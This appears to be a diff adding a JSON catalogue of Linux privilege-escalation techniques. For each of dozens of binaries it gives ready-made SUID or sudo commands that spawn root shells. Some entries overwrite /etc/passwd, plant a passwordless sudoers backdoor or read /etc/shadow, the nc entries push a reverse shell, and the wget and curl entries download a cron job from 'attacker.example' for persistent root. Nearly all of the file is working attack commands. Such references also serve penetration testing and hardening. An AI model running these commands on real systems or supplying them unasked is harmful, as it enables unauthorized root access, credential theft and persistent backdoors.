@@ -1,0 +1,443 @@
+{
+  "vim": {
+    "suid": {
+      "commands": [
+        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+      ],
+      "notes": "If vim has the SUID bit set, the python interpreter can be used to spawn a root shell. Requires vim compiled with Python support."
+    },
+    "sudo": {
+      "commands": [
+        "sudo vim -c ':!/bin/sh'"
+      ],
+      "notes": "Executes a shell from within vim while running as root."
+    }
+  },
+  "vi": {
+    "suid": {
+      "commands": [
+        "./vi -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
+      ],
+      "notes": "Same technique as vim; vi is often a symlink to vim."
+    },
+    "sudo": {
+      "commands": [
+        "sudo vi -c ':!/bin/sh'"
+      ],
+      "notes": "Shell escape from vi when run via sudo."
+    }
+  },
+  "find": {
+    "suid": {
+      "commands": [
+        "./find . -exec /bin/sh -p \\; -quit"
+      ],
+      "notes": "Use the -exec primary to run /bin/sh with the -p flag, preserving SUID privileges."
+    },
+    "sudo": {
+      "commands": [
+        "sudo find . -exec /bin/sh \\; -quit"
+      ],
+      "notes": "Run /bin/sh as root via find's -exec when invoked through sudo."
+    }
+  },
+  "bash": {
+    "suid": {
+      "commands": [
+        "./bash -p"
+      ],
+      "notes": "The -p option prevents bash from dropping privileges when EUID != UID."
+    },
+    "sudo": {
+      "commands": [
+        "sudo bash"
+      ],
+      "notes": "Trivial root shell when sudo permits bash."
+    }
+  },
+  "sh": {
+    "suid": {
+      "commands": [
+        "./sh -p"
+      ],
+      "notes": "Preserve privileges when SUID is set on /bin/sh."
+    },
+    "sudo": {
+      "commands": [
+        "sudo sh"
+      ],
+      "notes": "Direct root shell via sudo."
+    }
+  },
+  "python": {
+    "suid": {
+      "commands": [
+        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+      ],
+      "notes": "Use os.execl to spawn /bin/sh with -p, preserving SUID privileges."
+    },
+    "sudo": {
+      "commands": [
+        "sudo python -c 'import os; os.system(\"/bin/bash\")'"
+      ],
+      "notes": "Execute a shell as root from a Python one-liner."
+    }
+  },
+  "python3": {
+    "suid": {
+      "commands": [
+        "./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+      ],
+      "notes": "Same as python — use os.execl to preserve SUID privileges."
+    },
+    "sudo": {
+      "commands": [
+        "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
+      ],
+      "notes": "Spawn a root shell via Python 3 one-liner."
+    }
+  },
+  "perl": {
+    "suid": {
+      "commands": [
+        "./perl -e 'exec \"/bin/sh\";'"
+      ],
+      "notes": "Perl exec spawns /bin/sh; combined with SUID this yields a root shell."
+    },
+    "sudo": {
+      "commands": [
+        "sudo perl -e 'exec \"/bin/sh\";'"
+      ],
+      "notes": "Spawn a shell as root via Perl exec."
+    }
+  },
+  "ruby": {
+    "suid": {
+      "commands": [
+        "./ruby -e 'exec \"/bin/sh\"'"
+      ],
+      "notes": "Ruby exec replaces the current process with /bin/sh."
+    },
+    "sudo": {
+      "commands": [
+        "sudo ruby -e 'exec \"/bin/sh\"'"
+      ],
+      "notes": "Direct root shell via Ruby exec when invoked through sudo."
+    }
+  },
+  "awk": {
+    "suid": {
+      "commands": [
+        "./awk 'BEGIN {system(\"/bin/sh\")}'"
+      ],
+      "notes": "Use awk's system() to spawn a shell; combined with SUID yields elevated privileges."
+    },
+    "sudo": {
+      "commands": [
+        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+      ],
+      "notes": "Root shell via awk's BEGIN block when run with sudo."
+    }
+  },
+  "nmap": {
+    "suid": {
+      "commands": [
+        "./nmap --interactive",
+        "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF && ./nmap --script=$TF"
+      ],
+      "notes": "Older nmap versions support --interactive which exposes a shell escape. Modern nmap supports running NSE Lua scripts that can execute commands."
+    }
+  },
+  "less": {
+    "sudo": {
+      "commands": [
+        "sudo less /etc/profile",
+        "!/bin/sh"
+      ],
+      "notes": "From within less, the ! command runs an external shell command, inheriting sudo's elevated privileges."
+    }
+  },
+  "more": {
+    "sudo": {
+      "commands": [
+        "sudo more /etc/profile",
+        "!/bin/sh"
+      ],
+      "notes": "more supports shell escape via the ! command. Requires the input to be longer than a screen (or use TERM=dumb)."
+    }
+  },
+  "man": {
+    "sudo": {
+      "commands": [
+        "sudo man man",
+        "!/bin/sh"
+      ],
+      "notes": "man uses a pager (typically less) that supports shell escape via ! command."
+    }
+  },
+  "cp": {
+    "suid": {
+      "commands": [
+        "echo 'root2::0:0:root:/root:/bin/bash' | ./cp /dev/stdin /etc/passwd"
+      ],
+      "notes": "cp with SUID can overwrite arbitrary files; reading from /dev/stdin allows planting a new privileged user in /etc/passwd."
+    }
+  },
+  "mv": {
+    "suid": {
+      "commands": [
+        "echo 'root2::0:0:root:/root:/bin/bash' > /tmp/passwd_new && ./mv /tmp/passwd_new /etc/passwd"
+      ],
+      "notes": "mv with SUID can overwrite arbitrary files; combined with a crafted /etc/passwd entry this yields root."
+    }
+  },
+  "tee": {
+    "suid": {
+      "commands": [
+        "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | ./tee /etc/sudoers.d/backdoor"
+      ],
+      "notes": "tee with SUID allows writing to arbitrary root-owned files; planting a sudoers drop-in grants passwordless root."
+    }
+  },
+  "tar": {
+    "suid": {
+      "commands": [
+        "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+      ],
+      "notes": "tar's --checkpoint-action option runs an arbitrary command on each checkpoint; SUID tar yields a root shell."
+    }
+  },
+  "zip": {
+    "suid": {
+      "commands": [
+        "TF=$(mktemp -u) && ./zip $TF /etc/hosts -T --unzip-command='sh -c /bin/sh'"
+      ],
+      "notes": "zip's -T flag invokes the unzip-command to verify the archive; arbitrary commands run with SUID privileges."
+    }
+  },
+  "git": {
+    "sudo": {
+      "commands": [
+        "sudo git -p help config",
+        "!/bin/sh"
+      ],
+      "notes": "git pages help output through less by default; the pager supports shell escape via ! when running as root."
+    }
+  },
+  "strace": {
+    "sudo": {
+      "commands": [
+        "sudo strace -o /dev/null /bin/bash"
+      ],
+      "notes": "strace executes the traced program (here /bin/bash) with sudo's elevated privileges."
+    }
+  },
+  "env": {
+    "suid": {
+      "commands": [
+        "./env /bin/sh -p"
+      ],
+      "notes": "env executes arbitrary commands; combined with SUID and -p on the shell, preserves privileges."
+    },
+    "sudo": {
+      "commands": [
+        "sudo env /bin/sh"
+      ],
+      "notes": "env executes /bin/sh as root when invoked through sudo."
+    }
+  },
+  "dd": {
+    "suid": {
+      "commands": [
+        "./dd if=/etc/shadow"
+      ],
+      "notes": "dd with SUID can read privileged files (e.g., /etc/shadow) byte-by-byte, enabling offline credential cracking."
+    }
+  },
+  "chmod": {
+    "sudo": {
+      "commands": [
+        "sudo chmod +s /bin/bash && /bin/bash -p"
+      ],
+      "notes": "Set the SUID bit on bash, then invoke with -p to preserve privileges and obtain a root shell."
+    }
+  },
+  "chown": {
+    "sudo": {
+      "commands": [
+        "sudo chown $(id -un):$(id -gn) /etc/shadow"
+      ],
+      "notes": "Change ownership of /etc/shadow to the current user, then read or modify password hashes directly."
+    }
+  },
+  "socat": {
+    "suid": {
+      "commands": [
+        "./socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+      ],
+      "notes": "socat spawns a PTY connected to /bin/sh; with SUID this preserves elevated privileges."
+    }
+  },
+  "nc": {
+    "sudo": {
+      "commands": [
+        "sudo nc -e /bin/sh 127.0.0.1 9999"
+      ],
+      "notes": "OpenBSD netcat's -e flag runs a program after connection; here it pushes /bin/sh as root to a listener."
+    }
+  },
+  "netcat": {
+    "sudo": {
+      "commands": [
+        "sudo netcat -e /bin/sh 127.0.0.1 9999"
+      ],
+      "notes": "Same as nc — spawn a reverse shell with elevated privileges."
+    }
+  },
+  "wget": {
+    "sudo": {
+      "commands": [
+        "sudo wget http://attacker.example/evil -O /etc/cron.d/evil"
+      ],
+      "notes": "wget can write arbitrary content to root-owned paths; planting a cron job under /etc/cron.d achieves persistent root code execution."
+    }
+  },
+  "curl": {
+    "sudo": {
+      "commands": [
+        "sudo curl http://attacker.example/evil -o /etc/cron.d/evil"
+      ],
+      "notes": "Same as wget — fetch an attacker-controlled cron job and drop it into /etc/cron.d."
+    }
+  },
+  "lua": {
+    "suid": {
+      "commands": [
+        "./lua -e 'os.execute(\"/bin/sh\")'"
+      ],
+      "notes": "Lua's os.execute spawns /bin/sh; combined with SUID yields a root shell."
+    }
+  },
+  "node": {
+    "suid": {
+      "commands": [
+        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: \"inherit\"});'"
+      ],
+      "notes": "Node's child_process.spawn invokes /bin/sh with -p to preserve SUID privileges."
+    }
+  },
+  "php": {
+    "suid": {
+      "commands": [
+        "./php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
+      ],
+      "notes": "PHP's pcntl_exec replaces the current process with /bin/sh -p; preserves SUID privileges."
+    }
+  },
+  "gdb": {
+    "suid": {
+      "commands": [
+        "./gdb -q --nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
+      ],
+      "notes": "gdb's embedded Python interpreter can call execl to spawn a privilege-preserving shell."
+    }
+  },
+  "mount": {
+    "sudo": {
+      "commands": [
+        "sudo mount -o bind /bin/sh /bin/mount && sudo mount"
+      ],
+      "notes": "Bind-mount /bin/sh over a binary sudo allows the user to run, then re-invoke that binary as root."
+    }
+  },
+  "docker": {
+    "sudo": {
+      "commands": [
+        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      ],
+      "notes": "Members of the docker group (or sudo for docker) can mount the host root inside a container and chroot to obtain a root shell."
+    }
+  },
+  "rsync": {
+    "suid": {
+      "commands": [
+        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/tmp/"
+      ],
+      "notes": "rsync's -e option specifies the remote shell; pointing it at sh -p preserves SUID privileges."
+    }
+  },
+  "expect": {
+    "suid": {
+      "commands": [
+        "./expect -c 'spawn sh -p; interact'"
+      ],
+      "notes": "expect's spawn launches sh with -p to preserve privileges; interact attaches stdio."
+    }
+  },
+  "ionice": {
+    "sudo": {
+      "commands": [
+        "sudo ionice /bin/sh"
+      ],
+      "notes": "ionice executes an arbitrary command after setting IO scheduling; root shell when run via sudo."
+    }
+  },
+  "taskset": {
+    "sudo": {
+      "commands": [
+        "sudo taskset 1 /bin/sh"
+      ],
+      "notes": "taskset runs a command with a specified CPU affinity; passing /bin/sh yields a root shell."
+    }
+  },
+  "flock": {
+    "sudo": {
+      "commands": [
+        "sudo flock -u / /bin/sh"
+      ],
+      "notes": "flock executes a command while holding a file lock; with sudo, the command runs as root."
+    }
+  },
+  "nice": {
+    "sudo": {
+      "commands": [
+        "sudo nice /bin/sh"
+      ],
+      "notes": "nice runs a command with adjusted scheduling priority; passing /bin/sh under sudo yields a root shell."
+    }
+  },
+  "timeout": {
+    "sudo": {
+      "commands": [
+        "sudo timeout 7d /bin/sh"
+      ],
+      "notes": "timeout runs a command with a time limit; passing /bin/sh under sudo yields a root shell."
+    }
+  },
+  "watch": {
+    "sudo": {
+      "commands": [
+        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+      ],
+      "notes": "watch's -x flag runs the command without going through sh -c; combined with sudo yields a root shell."
+    }
+  },
+  "ed": {
+    "sudo": {
+      "commands": [
+        "sudo ed",
+        "!/bin/sh"
+      ],
+      "notes": "ed supports shell escape via the ! command; spawns a root shell when ed is invoked through sudo."
+    }
+  },
+  "nano": {
+    "sudo": {
+      "commands": [
+        "sudo nano",
+        "^R^X reset; sh 1>&0 2>&0"
+      ],
+      "notes": "nano's Read File (^R) followed by Execute Command (^X) runs an arbitrary shell command as root."
+    }
+  }
+}
